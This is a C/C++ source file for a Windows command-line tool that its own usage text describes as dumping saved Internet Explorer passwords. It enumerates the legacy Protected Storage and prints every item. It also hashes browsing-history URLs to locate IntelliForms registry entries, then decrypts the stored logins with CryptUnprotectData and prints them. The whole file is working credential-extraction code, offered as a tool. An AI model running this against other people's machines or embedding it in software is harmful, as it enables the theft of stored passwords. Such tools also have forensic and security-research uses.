#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <UrlHist.h> //IUrlHistoryStg2
#include <shlguid.h> //CLSID_CUrlHistory

#include "utils.h"

/* import type information from pstorec library */
#import "pstorec.dll" no_namespace

/* Link with the Advapi32.lib file */
#pragma comment(lib, "Advapi32.lib")

// Link with crypt32.lib
#pragma comment(lib, "crypt32.lib")

typedef HRESULT (WINAPI *PStoreCreateInstance_t)(IPStore **, DWORD, DWORD, DWORD);

#define URL_HISTORY_MAX 50000

static void usage(char* exe );
static int get_ie_ver();
static void dump_ie6();
static void dump_ie7();
static void print_guid(GUID g);
static int GetUrlHistory(wchar_t *UrlHistory[URL_HISTORY_MAX]);
static void GetHashStr(wchar_t *Password,char *HashStr);
static void PrintData(char *Data);

unsigned int log_level = LOG_LEVEL_NONE;

int main(int argc, char **argv){
    int version = 0;

    if (argc == 2) {
        if ( !strncmp(argv[1], "-vv", 3)) {
            log_level = LOG_LEVEL_VERY_VERBOSE;
        } else if (!strncmp(argv[1], "-v", 2)) {
            log_level = LOG_LEVEL_VERBOSE;
        }
        else if (!strncmp(argv[1], "-h", 2)) {
            usage(argv[0]);
            exit(0);
        }
    } else if (argc >= 3) {
        printf("Invalid parameters\n");
        exit(1);
    }

    version = get_ie_ver();
    printf("IE version: %d\n", version);

    // HKEY_CURRENT_USER\Software\Microsoft\Protected Storage System Provider
    // SYSTEM permissions
    VERBOSE(printf("Dumping password from Protected Store:\n"););
    dump_ie6();

    // HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\IntelliForms\Storage2
    VERBOSE(printf("Dumping password from Credentials Store:\n"););
    dump_ie7();

    return 0;
}

static void usage(char* exe ) {
    printf( "Unprotect and dump saved IE passwords\n" );
    printf( "%s [-v | -vv | -h]\n-v\tVerbose\n-vv\tVery verbose\n-h\tHelp", exe );
}

static int get_ie_ver(){
    char regKeyName[] = "SOFTWARE\\Microsoft\\Internet Explorer";
    char regValueName[] = "version";

    char val[_MAX_PATH] ="";
    DWORD valSize = _MAX_PATH;
    DWORD valType;

    HKEY rkey = 0;

    /* Open IE registry key*/
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regKeyName, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
        printf("Failed to open key : HKLM\\%s\n", regKeyName );
        return 1;
    }

    /*Read the version value*/
    if( RegQueryValueEx(rkey, regValueName, 0,  &valType, (unsigned char*)&val, &valSize) != ERROR_SUCCESS )
    {
        printf("Failed to read the key %s\n", regValueName);
        RegCloseKey(rkey);
        return 1;
    }
    VVERBOSE(printf("Type: %d, value: %s\n", valType, val););

    RegCloseKey(rkey);

    return atoi(val);
}

static void dump_ie6()
{
    HRESULT rc = 0;

    /* Get PStoreCreateInstance function ptr from DLL */
    PStoreCreateInstance_t PStoreCreateInstance_func;

    HMODULE lib_handle = LoadLibrary("pstorec.dll");
    PStoreCreateInstance_func = (PStoreCreateInstance_t) GetProcAddress(lib_handle, "PStoreCreateInstance");
    if (NULL == PStoreCreateInstance_func){
        HandleError("GetProcAddress");
    }

    /* Get a pointer to the Protected Storage provider */
    IPStore *ps_provider;
    PStoreCreateInstance_func(&ps_provider,
            NULL,   // get base storage provider
            0,      // reserved
            0       // reserved
    );

    /* Get an interface for enumerating registered types from protected db */
    IEnumPStoreTypesPtr enum_types;
    rc = ps_provider->EnumTypes(0,      // PST_KEY_CURRENT_USER
            0,                          // Reserved, must be set to 0
            &enum_types
    );

    if (0 != rc ) {
        printf("IPStore::EnumTypes method failed.\n");
        ExitProcess(1);
    }

    GUID type, sub_type;
    unsigned long num;
    while((rc = enum_types->raw_Next(
            1,          // number of types requested
            &type,      // GUID
            &num        // pointer to number of types fetched
    ))>=0)
    {
        VERBOSE(printf("Fetched %d type(s): ", num); print_guid(type););

        /* Get an interface for enumerating sub-types */
        IEnumPStoreTypesPtr enum_sub_types;
        ps_provider->EnumSubtypes(0,    // PST_KEY_CURRENT_USER
                &type,
                0,                      // reserved, must be set to 0
                &enum_sub_types);


        while((rc = enum_sub_types->raw_Next(1,     // number of sub-types requested
                &sub_type,                          // GUID
                &num                                // pointer to number of types fetched
        )) >=0)
        {
            VERBOSE(printf(" Fetched %d sub-type(s): ", num); print_guid(sub_type););

            /* Get an nterface for enumerating items */
            IEnumPStoreItemsPtr enum_items;
            ps_provider->EnumItems(0,       // PST_KEY_CURRENT_USER
                    &type,                  // type GUID
                    &sub_type,              // sub type GUID
                    0,                      // reserved, must be 0
                    &enum_items
            );

            LPWSTR item;
            while((rc=enum_items->raw_Next(1,   // number of items requested
                    &item,
                    &num
            )) >=0) {
                printf("  Fetched %d item(s): ", num); wprintf(L"%ws\n", item);

                unsigned long item_len = 0;
                unsigned char *item_data = NULL;

                ps_provider->ReadItem(0,    // PST_KEY_CURRENT_USER
                        &type,              // GUID type
                        &sub_type,          // GUID sub-type
                        item,
                        &item_len,          // stored item length
                        &item_data,         // buffer that contains the stored item
                        NULL,               // Pointer to prompt structure
                        0);
                VVERBOSE(printf("Item len: %d\n", item_len););
                dump_bytes(item_data, item_len, 1);

                /* Free read item */
                CoTaskMemFree(item);
            }
        }
    }
}

/* Original work: SapporoWorks
http://www.securityfocus.com/archive/1/458115/30/0/threaded
 */
static void dump_ie7()
{
    // retrieve URL from the history
    wchar_t *UrlHistory[URL_HISTORY_MAX];
    int UrlListoryMax = GetUrlHistory(UrlHistory);

    char *KeyStr = {"Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"};
    HKEY hKey;
    // enumerate values of the target registry

    if(ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER,KeyStr,0,KEY_QUERY_VALUE,&hKey)){
        printf("RegOpenKeyEx error\n");
    }

    for(int i=0; ; i++){
        char Val[1024];
        DWORD Size = 1024;
        if(ERROR_NO_MORE_ITEMS==RegEnumValue(hKey,i,Val, &Size,
                NULL,NULL, NULL, NULL)) {
            break;
        }

        // compare the value of the retrieved registry with the hash
        // value of the history URL
        for(int n=0;n<UrlListoryMax;n++){
            char HashStr[1024];
            // calculate hash using URL as Password
            GetHashStr(UrlHistory[n],HashStr);
            if(strcmp(Val,HashStr)==0){// find password URL
                VERBOSE(printf("ur : %ls\n",UrlHistory[n]););
                VERBOSE(printf("hash : %s\n",HashStr););
                // retrieve data from the registry
                DWORD BufferLen;
                DWORD dwType;

                RegQueryValueEx(hKey,Val,0,&dwType,NULL,&BufferLen);
                BYTE *Buffer = new BYTE[BufferLen];

                if(RegQueryValueEx(hKey,Val,0,&dwType,Buffer,&BufferLen)==ERROR_SUCCESS){
                    DATA_BLOB DataIn;
                    DATA_BLOB DataOut;
                    DATA_BLOB OptionalEntropy;
                    DataIn.pbData = Buffer;
                    DataIn.cbData = BufferLen;
                    OptionalEntropy.pbData = (unsigned char
                            *)UrlHistory[n];
                    OptionalEntropy.cbData =
                            (wcslen(UrlHistory[n])+1)*2;

                    if(CryptUnprotectData(&DataIn,0,&OptionalEntropy,NULL,NULL,1,&DataOut))
                    {
                        //display the decoded data
                        PrintData((char *)DataOut.pbData);
                        LocalFree(DataOut.pbData);
                    }
                    delete [] Buffer;
                }
                break;
            }
        }
    }
    RegCloseKey(hKey);

}

/*typedef struct _GUID {
    DWORD Data1;
    WORD  Data2;
    WORD  Data3;
    BYTE  Data4[8];
} GUID;*/
static void print_guid(GUID g){

    printf("%08x-%04hx-%04hx-", g.Data1, g.Data2, g.Data3);
    for(int i = 0; i<8; ++i){
        if(i==2) {
            printf("-");
        }
        printf("%02x", g.Data4[i]);
    }
    printf("\n");
}

// retrieve the history of URLs
static int GetUrlHistory(wchar_t *UrlHistory[URL_HISTORY_MAX])
{
    int max = 0;
    HRESULT hr;

    CoInitialize(NULL);// COM Initialization
    IUrlHistoryStg2* pUrlHistoryStg2=NULL;
    hr = CoCreateInstance(CLSID_CUrlHistory, NULL,
            CLSCTX_INPROC_SERVER,IID_IUrlHistoryStg2,(void**)(&pUrlHistoryStg2));
    if(!SUCCEEDED(hr)){
        return -1;
    }

    IEnumSTATURL* pEnumUrls;
    hr = pUrlHistoryStg2->EnumUrls(&pEnumUrls);
    if (!SUCCEEDED(hr)){
        return -1;
    }

    STATURL StatUrl[1];
    ULONG ulFetched;
    while (max<URL_HISTORY_MAX && (hr = pEnumUrls->Next(1,
            StatUrl, &ulFetched)) == S_OK){
        if (StatUrl->pwcsUrl != NULL) {
            // If there is a parameter,delete it.
            wchar_t *p;
            if(NULL!=(p = wcschr(StatUrl->pwcsUrl,'?')))
                *p='\0';
            UrlHistory[max] = new
                    wchar_t[wcslen(StatUrl->pwcsUrl)+1];
            wcscpy(UrlHistory[max],StatUrl->pwcsUrl);
            max++;
        }
    }

    pEnumUrls->Release();
    pUrlHistoryStg2->Release();

    CoUninitialize();

    return max;
}

/* Calculate the hash value from Password, and retrieve it as a
character string */
static void GetHashStr(wchar_t *Password,char *HashStr)
{
    HashStr[0]='\0';
    HCRYPTPROV  hProv = NULL;
    HCRYPTHASH  hHash = NULL;
    CryptAcquireContext(&hProv, 0,0,PROV_RSA_FULL,0);

    //  instance of hash calculation
    if(!CryptCreateHash(hProv,CALG_SHA1, 0, 0,&hHash)){
        return;
    }

    //calculation of hash value
    if(!CryptHashData(hHash,(unsigned char *)Password,
            (wcslen(Password)+1)*2,0)){
        return;
    }

    // retrieve 20 bytes of hash value
    DWORD dwHashLen=20;
    BYTE Buffer[20];

    if(!CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen, 0)){
        return;
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    // creation of character string based on hash
    char TmpBuf[128];
    unsigned char tail=0;// variable to calculate value for the last 2 bytes
    // convert to a character string in hexadecimal
    for(int i=0; i<20; i++){
        unsigned char c = Buffer[i];
        tail+=c;
        wsprintf(TmpBuf,"%s%2.2X",HashStr,c);
        strcpy(HashStr,TmpBuf);
    }
    // add the last 2 bytes
    wsprintf(TmpBuf,"%s%2.2X",HashStr,tail);
    strcpy(HashStr,TmpBuf);
}

static void PrintData(char *Data)
{
    unsigned int HeaderSize;
    unsigned int DataSize;
    unsigned int DataMax;
    //the 4th byte from the beginning is Header size
    memcpy(&HeaderSize,&Data[4],4);

    //the 8th byte from the beginning is Data size
    memcpy(&DataSize,&Data[8],4);

    //the 20th byte from the beginning is Data number
    memcpy(&DataMax,&Data[20],4);

    printf("HeaderSize=%d DataSize=%d DataMax=%d\n",
            HeaderSize,DataSize,DataMax);

    char *pInfo = &Data[36];

    // afterwards, the same number of information data (16 bytes)
    // as the data number comes
    for(unsigned int n=0;n<DataMax;n++){
        FILETIME ft,ftLocal;
        SYSTEMTIME st;
        unsigned int offset;
        // the 0th byte from the beginning of information data is
        // the offset of the data
        memcpy(&offset,pInfo,4);

        // the 4th byte from the beginning of information data is the date
        memcpy(&ft,pInfo+4,8);

        // the 12th byte from the beginning of information data is
        // the data length
        FileTimeToLocalFileTime(&ft,&ftLocal);
        FileTimeToSystemTime(&ftLocal, &st);

        char TmpBuf[1024];
        int len = WideCharToMultiByte(CP_THREAD_ACP, 0,(wchar_t*)
                &Data[HeaderSize+12+offset], -1, NULL, 0, NULL, NULL );
        if(-1!=len){
            WideCharToMultiByte(CP_THREAD_ACP, 0,
                    (wchar_t*)&Data[HeaderSize+12+offset],
                    wcslen((wchar_t*)&Data[HeaderSize+12+offset])+1, TmpBuf, len,
                    NULL, NULL );
            printf("[%d][%4.4d/%2.2d/%2.2d %2.2d:%2.2d]%s\n",
                    n,st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,TmpBuf);
        }
        pInfo+=16;
    }
}
